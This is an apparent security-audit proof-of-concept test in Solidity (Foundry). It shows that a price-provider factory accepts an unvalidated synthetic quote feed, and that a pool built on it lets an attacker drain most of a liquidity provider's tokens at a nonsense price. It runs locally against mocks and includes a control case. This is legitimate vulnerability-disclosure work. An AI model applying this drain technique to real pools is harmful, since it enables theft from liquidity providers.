// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

/// @title M-P1-1 PoC — APP synthetic quote leg escapes envelope + denominator validation
/// @notice The AnchoredProviderFactory envelope is keyed on baseFeedId ONLY.
///         quoteFeedId is never validated for existence, class, or
///         denominator — at creation or at read — and the pool factory's
///         _validatePriceProvider checks only non-zero + token0()/token1().
///         A synthetic provider can therefore quote a confident,
///         tightly-banded, completely meaningless cross (e.g. BTC/USD ÷
///         ETH/BTC) that passes every guard, and a pool built on it executes
///         swaps at the garbage price:
///           1. createAnchoredProvider(base=BTC/USD, quote=ETH/BTC) SUCCEEDS;
///              isProvider() == true. Creation also succeeds with a quote
///              feed that has NO data at all (never validated for existence).
///           2. getQuote() returns a tight band around the garbage mid
///              (~1,208,178 token1 per token0 vs the true ~18.57 cross).
///           3. createPool with that provider SUCCEEDS.
///           4. A swapper sells token0 into the pool at the garbage price
///              and drains ~all of the pool's token1 for a pittance of
///              token0; the LP loses most of the position's true value.
///         Control: the same flow with the correct quote leg (ETH/USD)
///         quotes ~18.57, swaps at ~18.57, and the LP loses ~0.
/// @dev Test-only file. Run inside a scratch copy of pool-contracts
///      (pinned ddf8ae0) with remappings.txt extended by:
///         oracle-contracts/=<path>/repos/oracle-contracts/contracts/
///      forge test --match-contract MP11SyntheticGarbageTest -vv
///      Local deployment of the exact repo code only (pool-contracts
///      ddf8ae0, oracle-contracts 7525bbd). No fork, no RPC, no mainnet
///      state. Real AnchoredProviderFactory + real AnchoredPriceProvider +
///      real MetricOmmPoolFactory/pool, with a MockPricedOracle standing in
///      for the allow-listed oracle (it implements the exact
///      IPricedOracle.price / IOffchainOracle.priceGuard surface the APP
///      reads; no gating, since the claim is about validation, not oracle
///      access control).

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {MetricOmmPoolBaseTest} from "./MetricOmmPool.base.t.sol";
import {MetricOmmPoolFactory} from "../contracts/MetricOmmPoolFactory.sol";
import {MetricOmmPoolDeployer} from "../contracts/MetricOmmPoolDeployer.sol";
import {PoolParameters} from "../contracts/types/FactoryOperation.sol";
import {ExtensionOrders} from "../contracts/types/PoolExtensionsConfig.sol";
import {LiquidityDelta} from "../contracts/types/PoolOperation.sol";
import {PoolStateTestLib} from "./PoolStateTestLib.sol";
import {AnchoredProviderFactory} from "oracle-contracts/AnchoredProviderFactory.sol";
import {AnchoredPriceProvider} from "oracle-contracts/AnchoredPriceProvider.sol";
import {IAnchoredProviderFactory} from "oracle-contracts/interfaces/IAnchoredProviderFactory.sol";

/// @notice Minimal stand-in for an allow-listed oracle: implements exactly
///         the two reads the APP makes — IPricedOracle.price(feedId, pool)
///         and IOffchainOracle.priceGuard(feedId). No access gating (the
///         claim under test is validation, not oracle gating).
contract MockPricedOracle {
    struct Feed {
        uint256 mid;
        uint256 spread;
        uint256 refTime;
    }

    mapping(bytes32 => Feed) public feeds;

    function setFeed(bytes32 feedId, uint256 mid, uint256 spread) external {
        feeds[feedId] = Feed(mid, spread, block.timestamp);
    }

    function price(bytes32 feedId, address)
        external
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        Feed storage f = feeds[feedId];
        return (f.mid, f.spread, 0, f.refTime);
    }

    function priceGuard(bytes32) external pure returns (uint128, uint128) {
        return (0, 0);
    }
}

contract MP11SyntheticGarbageTest is MetricOmmPoolBaseTest {
    uint256 private constant Q64 = 2 ** 64;

    // Feeds (raw bytes32 ids — opaque, exactly the curator's view).
    bytes32 internal constant BTC_USD = keccak256("BTC/USD");
    bytes32 internal constant ETH_BTC = keccak256("ETH/BTC");
    bytes32 internal constant ETH_USD = keccak256("ETH/USD");
    bytes32 internal constant NOPE = keccak256("NOPE/NOPE");

    // 8-decimal mids.
    uint256 internal constant BTC_USD_MID = 65_000 * 1e8; // 6.5e12
    uint256 internal constant ETH_BTC_MID = 5_380_000; // 0.0538 BTC/ETH
    uint256 internal constant ETH_USD_MID = 3_500 * 1e8; // 3.5e11
    // BTC/USD expressed in cents instead of dollars (wrong denominator):
    // mid 100x too large, so the cross collapses 100x.
    uint256 internal constant BTC_USD_CENTS_MID = 6_500_000 * 1e8; // 6.5e14
    bytes32 internal constant BTC_USD_CENTS = keccak256("BTC/USD-cents");
    uint256 internal constant TIGHT_SPREAD = 100; // 1 bp, 0.01-bps units

    // True BTC/ETH cross, 6 decimals (18.571428).
    uint256 internal constant TRUE_CROSS_E6 = 18_571_428;

    int16 internal constant LO = -5;
    int16 internal constant HI = 4;
    uint104 internal constant SHARES = 10_000_000;
    uint80 internal constant SALT = 0;

    MockPricedOracle internal mockOracle;
    AnchoredProviderFactory internal appFactory;
    MetricOmmPoolFactory internal poolFactory;

    function setUp() public override {
        super.setUp();

        mockOracle = new MockPricedOracle();
        mockOracle.setFeed(BTC_USD, BTC_USD_MID, TIGHT_SPREAD);
        mockOracle.setFeed(ETH_BTC, ETH_BTC_MID, TIGHT_SPREAD);
        mockOracle.setFeed(ETH_USD, ETH_USD_MID, TIGHT_SPREAD);
        mockOracle.setFeed(BTC_USD_CENTS, BTC_USD_CENTS_MID, TIGHT_SPREAD);
        // NOPE deliberately has no data.

        appFactory = new AnchoredProviderFactory(address(this));
        appFactory.addOracle(address(mockOracle));
        // Production-like DEFAULT_CLASS envelope: minMargin 1e11–1e15,
        // staleness 0–60s, spreadMultMax 2e18.
        appFactory.setEnvelope(
            appFactory.DEFAULT_CLASS(),
            IAnchoredProviderFactory.Envelope({
                minMarginMin: 1e11,
                minMarginMax: 1e15,
                stalenessMin: 0,
                stalenessMax: 60,
                spreadMultMax: 2e18,
                exists: true
            })
        );

        poolFactory = new MetricOmmPoolFactory(address(this), address(this), 0, 0, type(uint16).max);
        MetricOmmPoolDeployer deployer = new MetricOmmPoolDeployer(address(poolFactory));
        poolFactory.setPoolDeployer(address(deployer));
    }

    function _createApp(bytes32 baseFeed, bytes32 quoteFeed) internal returns (AnchoredPriceProvider app) {
        IAnchoredProviderFactory.InitialConfig memory init = IAnchoredProviderFactory.InitialConfig({
            source: address(0),
            baseMaxStaleness: 60,
            quoteMaxStaleness: 60,
            baseSpreadMult: 1e18,
            quoteSpreadMult: 1e18
        });
        address appAddr = appFactory.createAnchoredProvider(
            address(mockOracle), baseFeed, quoteFeed, 1e13, 60, 2e18, false, 0, address(token0), address(token1), init
        );
        return AnchoredPriceProvider(appAddr);
    }

    function _createPool(address provider, bytes32 salt) internal returns (address poolAddr) {
        ExtensionOrders memory orders;
        PoolParameters memory params = PoolParameters({
            token0: address(token0),
            token1: address(token1),
            priceProvider: provider,
            extensions: new address[](0),
            extensionOrders: orders,
            extensionInitData: new bytes[](0),
            priceProviderTimelock: type(uint256).max,
            admin: address(this),
            initialScaledAmount0PerE18Shares: 1e18,
            initialScaledAmount1PerE18Shares: 1e18,
            minimalOperationalLiquidity: 1e6,
            protocolSpreadFeeE6: 0,
            adminSpreadFeeE6: ADMIN_FEE,
            protocolNotionalFeeE8: 0,
            adminNotionalFeeE8: 0,
            adminFeeDestination: makeAddr("adminFeeDest"),
            curBinDistFromProvidedPriceE6: 0,
            nonNegativeBinDataArray: _createBinDataArray(),
            negativeBinDataArray: _createBinDataArray(),
            salt: salt,
            bidAskRefAsymmetryX8: type(uint16).max
        });
        poolAddr = poolFactory.createPool(params);
        _approveUsersForPool(poolAddr);
    }

    function _addTo(address poolAddr, uint256 userIndex) internal returns (uint256 a0, uint256 a1) {
        LiquidityDelta memory deltas = _rangeDeltas(LO, HI, SHARES);
        vm.prank(users[userIndex]);
        return callers[userIndex].addLiquidity(poolAddr, SALT, deltas);
    }

    function _removeFrom(address poolAddr, uint256 userIndex, uint104 shares) internal returns (uint256 r0, uint256 r1) {
        LiquidityDelta memory deltas = _rangeDeltas(LO, HI, shares);
        vm.prank(users[userIndex]);
        return callers[userIndex].removeLiquidity(poolAddr, SALT, deltas);
    }

    /// @dev Exact-output swap: negative amountSpecified = exact token1 out.
    ///      Returns (token0 paid by caller, token1 received by caller).
    function _swapExactOutToken1(address poolAddr, uint256 userIndex, uint128 token1Out)
        internal
        returns (uint256 token0Paid, uint256 token1Got)
    {
        int128 amount = -SafeCast.toInt128(SafeCast.toInt256(uint256(token1Out)));
        vm.prank(users[userIndex]);
        (int256 d0, int256 d1) =
            callers[userIndex].swap(poolAddr, users[userIndex], true, amount, uint128(0));
        require(d0 > 0 && d1 < 0, "unexpected swap deltas");
        return (uint256(d0), uint256(-d1));
    }

    /// @dev Exact-output swap in the other direction: negative
    ///      amountSpecified = exact token0 out (zeroForOne == false).
    ///      Returns (token0 received by caller, token1 paid by caller).
    function _swapExactOutToken0(address poolAddr, uint256 userIndex, uint128 token0Out)
        internal
        returns (uint256 token0Got, uint256 token1Paid)
    {
        int128 amount = -SafeCast.toInt128(SafeCast.toInt256(uint256(token0Out)));
        vm.prank(users[userIndex]);
        (int256 d0, int256 d1) =
            callers[userIndex].swap(poolAddr, users[userIndex], false, amount, type(uint128).max);
        require(d0 < 0 && d1 > 0, "unexpected swap deltas");
        return (uint256(-d0), uint256(d1));
    }

    /// @dev True value of (a0, a1) in token1 units at the true 18.571428 cross.
    function _trueValueToken1(uint256 a0, uint256 a1) internal pure returns (uint256) {
        return a0 * TRUE_CROSS_E6 / 1e6 + a1;
    }

    // (1) CORE CLAIM (a): the factory accepts a synthetic provider whose
    //     quote leg is a meaningless cross — and even a quote leg with NO
    //     data at all. Neither existence, class, nor denominator is checked.
    function test_1_factoryAcceptsGarbageSynthetic() public {
        AnchoredPriceProvider garbage = _createApp(BTC_USD, ETH_BTC);
        assertTrue(appFactory.isProvider(address(garbage)), "garbage APP must be a provider");

        // Quote leg with no data anywhere: creation still succeeds.
        AnchoredPriceProvider noData = _createApp(BTC_USD, NOPE);
        assertTrue(appFactory.isProvider(address(noData)), "no-data quote leg must still deploy");
        // ...but reads halt until the leg has data (fail-closed at read).
        vm.expectRevert(AnchoredPriceProvider.FeedStalled.selector);
        noData.getQuote();
    }

    // (2) CORE CLAIM (b): getQuote() returns a CONFIDENT, TIGHTLY-BANDED
    //     quote around the garbage mid — every guard passes.
    function test_2_garbageQuoteConfidentTight() public {
        AnchoredPriceProvider garbage = _createApp(BTC_USD, ETH_BTC);
        (uint128 bid, uint128 ask, uint128 ref) = garbage.getQuote();

        uint256 expectedRef = (BTC_USD_MID * Q64) / ETH_BTC_MID; // ~1,208,178 * Q64
        uint256 expectedTrue = (BTC_USD_MID * Q64) / ETH_USD_MID; // ~18.57 * Q64
        console.log("garbage ref (Q64):");
        console.log(uint256(ref));
        console.log("expected garbage ref (Q64):");
        console.log(expectedRef);
        console.log("true cross ref (Q64):");
        console.log(expectedTrue);

        assertGt(uint256(ref), expectedRef * 999 / 1000, "ref must be the garbage mid");
        assertLt(uint256(ref), expectedRef * 1001 / 1000, "ref must be the garbage mid");
        assertGt(uint256(ref), expectedTrue * 1000, "garbage mid must be >> true cross");
        assertGt(uint256(bid), 0, "bid must be positive");
        assertLt(uint256(bid), uint256(ref), "bid < ref");
        assertGt(uint256(ask), uint256(ref), "ask > ref");
        // Band width < 0.1% — tightly banded (expected ~0.04%).
        uint256 widthBps = (uint256(ask) - uint256(bid)) * 1e18 / uint256(ref);
        console.log("band width, 1e18 scale (1e15 = 0.1%):");
        console.log(widthBps);
        assertLt(widthBps, 1e15, "band must be tight (<0.1%)");
    }

    // (3) CORE CLAIM (c): the pool factory accepts the garbage provider —
    //     _validatePriceProvider checks only non-zero + token match.
    function test_3_poolAcceptsGarbageProvider() public {
        AnchoredPriceProvider garbage = _createApp(BTC_USD, ETH_BTC);
        address poolAddr = _createPool(address(garbage), keccak256("MP11-3"));
        assertTrue(poolFactory.isPool(poolAddr), "pool must be registered");
    }

    // (4) CORE CLAIM (d): a swap executes at the garbage price and drains
    //     the LP's token1 side. Attacker exact-outs 90% of the pool's
    //     token1; the drainable side is the token1 side here because the
    //     garbage cross OVERPRICES token0 (~1.2e6 vs the true 18.57), so the
    //     pool sells its token1 for a pittance of token0.
    //     NOTE on the loss metric: the harness deposit is 50M/50M raw, and
    //     at the true cross the token0 side is worth ~19x the token1 side,
    //     so draining the whole token1 side is ~5% of total position value.
    //     The honest impact measure is the drainable side itself: 90% of
    //     the pool's token1 extracted for ~0.008% of its true value.
    //     Test_6 shows the mirror image (underpriced token0), where the
    //     drainable side is the majority of the position's value.
    function test_4_swapAtGarbagePrice_drainsLP() public {
        AnchoredPriceProvider garbage = _createApp(BTC_USD, ETH_BTC);
        address poolAddr = _createPool(address(garbage), keccak256("MP11-4"));

        (uint256 a0, uint256 a1) = _addTo(poolAddr, 1);
        assertGt(a0, 0, "LP must deposit token0");
        assertGt(a1, 0, "LP must deposit token1");
        uint256 valueIn = _trueValueToken1(a0, a1);
        console.log("LP deposit token0 / token1 / true value (token1):");
        console.log(a0);
        console.log(a1);
        console.log(valueIn);

        // Attacker (user 2) exact-outs 90% of the pool's token1.
        uint128 target = uint128(a1 * 90 / 100);
        (uint256 paid0, uint256 got1) = _swapExactOutToken1(poolAddr, 2, target);
        assertGe(got1, uint256(target) * 999 / 1000, "attacker must receive ~target token1");
        uint256 effRateE6 = got1 * 1e6 / paid0; // token1 per token0, 6 decimals
        console.log("attacker paid token0 / got token1 / effective rate E6:");
        console.log(paid0);
        console.log(got1);
        console.log(effRateE6);
        // Effective rate must be ~garbage (~1.2e6), i.e. > 1e6 token1 per
        // token0 — versus the true 18.57. A >50,000x mispricing.
        assertGt(effRateE6, 1_000_000 * 1e6, "effective rate must be garbage-scale");
        assertGt(effRateE6, TRUE_CROSS_E6 * 1000, "effective rate must be >1000x true cross");

        // Attacker paid < 0.1% of the extracted value (true-value terms).
        uint256 paid0TrueValue = paid0 * TRUE_CROSS_E6 / 1e6;
        assertLt(paid0TrueValue, got1 / 1000, "attacker must pay <0.1% of extracted value");

        // LP exits in full: it recovers <= ~11% of its token1 deposit.
        (uint256 r0, uint256 r1) = _removeFrom(poolAddr, 1, SHARES);
        uint256 valueOut = _trueValueToken1(r0, r1);
        uint256 lossPct = (valueIn - valueOut) * 100 / valueIn;
        console.log("LP exit token0 / token1 / true value / total loss pct:");
        console.log(r0);
        console.log(r1);
        console.log(valueOut);
        console.log(lossPct);
        assertLt(r1, a1 * 11 / 100, "LP must recover <11% of its token1");
        assertGt((a1 - r1) * 100 / a1, 80, "LP must lose >80% of its token1 deposit");
    }

    // (5) CONTROL: the correct quote leg (ETH/USD) quotes ~18.57, swaps at
    //     ~18.57, and the LP loses ~nothing. Proves the drain in test_4 is
    //     caused by the garbage leg, not the harness.
    function test_5_control_correctCross() public {
        AnchoredPriceProvider correct = _createApp(BTC_USD, ETH_USD);
        (uint128 bid, uint128 ask, uint128 ref) = correct.getQuote();
        uint256 expectedTrue = (BTC_USD_MID * Q64) / ETH_USD_MID;
        assertGt(uint256(ref), expectedTrue * 999 / 1000, "control ref must be the true cross");
        assertLt(uint256(ref), expectedTrue * 1001 / 1000, "control ref must be the true cross");
        assertLt(uint256(bid), uint256(ref), "control bid < ref");
        assertGt(uint256(ask), uint256(ref), "control ask > ref");

        address poolAddr = _createPool(address(correct), keccak256("MP11-5"));
        (uint256 a0, uint256 a1) = _addTo(poolAddr, 1);
        uint256 valueIn = _trueValueToken1(a0, a1);

        uint128 target = uint128(a1 * 90 / 100);
        (uint256 paid0, uint256 got1) = _swapExactOutToken1(poolAddr, 2, target);
        uint256 effRateE6 = got1 * 1e6 / paid0;
        console.log("control effective rate E6 (true = 18,571,428):");
        console.log(effRateE6);
        assertGt(effRateE6, TRUE_CROSS_E6 * 95 / 100, "control rate must be ~true cross");
        assertLt(effRateE6, TRUE_CROSS_E6 * 105 / 100, "control rate must be ~true cross");

        (uint256 r0, uint256 r1) = _removeFrom(poolAddr, 1, SHARES);
        uint256 valueOut = _trueValueToken1(r0, r1);
        uint256 lossPct = valueIn > valueOut ? (valueIn - valueOut) * 100 / valueIn : 0;
        console.log("control LP loss pct:");
        console.log(lossPct);
        assertLt(lossPct, 2, "control LP must lose <2%");
    }

    // (6) MIRROR IMAGE — wrong-denominator quote leg: base BTC/USD divided
    //     by a BTC/USD feed expressed in CENTS (mid 100x too large) makes
    //     the cross 100x too SMALL (~0.01 token1 per token0 vs the true
    //     18.57). Now token0 is the underpriced side and the drainable side
    //     is the MAJORITY of the position's true value. Attacker exact-outs
    //     90% of the pool's token0 for a pittance of token1.
    function test_6_wrongDenominator_drainsToken0Side() public {
        AnchoredPriceProvider garbage = _createApp(BTC_USD, BTC_USD_CENTS);
        (uint128 bid, uint128 ask, uint128 ref) = garbage.getQuote();
        uint256 expectedRef = (BTC_USD_MID * Q64) / BTC_USD_CENTS_MID; // ~0.01 * Q64
        assertGt(uint256(ref), expectedRef * 999 / 1000, "cents ref must be ~0.01");
        assertLt(uint256(ref), expectedRef * 1001 / 1000, "cents ref must be ~0.01");
        console.log("cents-denominator ref (Q64):");
        console.log(uint256(ref));

        address poolAddr = _createPool(address(garbage), keccak256("MP11-6"));
        (uint256 a0, uint256 a1) = _addTo(poolAddr, 1);
        uint256 valueIn = _trueValueToken1(a0, a1);
        console.log("LP deposit token0 / token1 / true value (token1):");
        console.log(a0);
        console.log(a1);
        console.log(valueIn);

        // Attacker (user 2) exact-outs 90% of the pool's token0.
        uint128 target = uint128(a0 * 90 / 100);
        (uint256 got0, uint256 paid1) = _swapExactOutToken0(poolAddr, 2, target);
        assertGe(got0, uint256(target) * 999 / 1000, "attacker must receive ~target token0");
        // token0 per token1: ~100 vs the true 0.0538 — ~1,857x.
        uint256 effRateE6 = got0 * 1e6 / paid1; // token0 per token1, 6 decimals
        console.log("attacker got token0 / paid token1 / effective rate E6:");
        console.log(got0);
        console.log(paid1);
        console.log(effRateE6);
        assertGt(effRateE6, 50 * 1e6, "effective rate must be ~100 token0 per token1");
        // Attacker paid < 1% of the extracted value (true-value terms).
        uint256 got0TrueValue = got0 * TRUE_CROSS_E6 / 1e6;
        assertLt(paid1, got0TrueValue / 100, "attacker must pay <1% of extracted value");

        // LP exits in full; the total true-value loss must be large.
        (uint256 r0, uint256 r1) = _removeFrom(poolAddr, 1, SHARES);
        uint256 valueOut = _trueValueToken1(r0, r1);
        uint256 lossPct = (valueIn - valueOut) * 100 / valueIn;
        console.log("LP exit token0 / token1 / true value / total loss pct:");
        console.log(r0);
        console.log(r1);
        console.log(valueOut);
        console.log(lossPct);
        assertGt(lossPct, 50, "LP must lose >50% of true value");
        assertLt(r0, a0 * 11 / 100, "LP must recover <11% of its token0");
    }
}
